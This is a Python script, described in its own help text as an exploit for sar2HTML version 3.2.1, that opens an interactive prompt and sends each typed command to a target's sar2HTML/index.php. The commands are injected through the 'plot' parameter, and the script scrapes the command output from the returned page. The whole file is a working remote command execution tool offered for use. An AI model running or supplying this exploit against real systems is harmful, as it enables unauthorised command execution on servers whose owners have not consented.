import argparse
import sys

## Import third party libs. Handle accordingly. 
try:
	import requests
	from bs4 import BeautifulSoup
except Exception as e:
	print(f'[!] {e}. Please install using pip.')
	sys.exit(-1)

def GetCommandOutput(link, command):
	parameters = {
	    'plot':'LINUX;{}'.format(command)
	}

	r = requests.get(url=link, params=parameters)
	if r.reason == 'OK':
		soup = BeautifulSoup(r.content, 'html.parser')
		soup = soup.find_all('option')

		## Take out the first two items because they are not needed.
		soup.pop(0)
		soup.pop(0)

		## Take out the last two items since that is also not needed.
		soup.pop()
		soup.pop()

		## Now print the output
		for item in soup:
			print(item.text)

def main(arguments):
	target = arguments.target 
	port = arguments.port 
	
	if port != '80':
		target = f'http://{target}:{port}/sar2HTML/index.php'
	else:
		target = f'http://{target}/sar2HTML/index.php'

	while True:
		command = input('kali@kali')

		## Give the user a way out of this while loop
		if command == 'exit' or command == 'break':
			break

		## Exploit the vulnerability. 
		GetCommandOutput(target, command)


if __name__ == '__main__':
	
	parser = argparse.ArgumentParser(
		usage='%(prog)s -t/--target <ip> -p/--port <port>', ## This will override the default help settings done by argparse.
		description='An exploit for sar2HTML version 3.2.1', ## The description of what script will do and how it works. 
		epilog='Happy hacking! :)'                          
		)
	parser.add_argument('-t', '--target', metavar='IP', help='The target IP address.') ## Use metavar to make it pretty 
	parser.add_argument('-p', '--port', metavar='port', help='The target\'s port. Default port is 80.', default=80) 
	args = parser.parse_args()

	## Validate user input to ensure script will work correctly
	if args.target is None:
		parser.print_help()
		sys.exit(0)

	main(args)


## EOF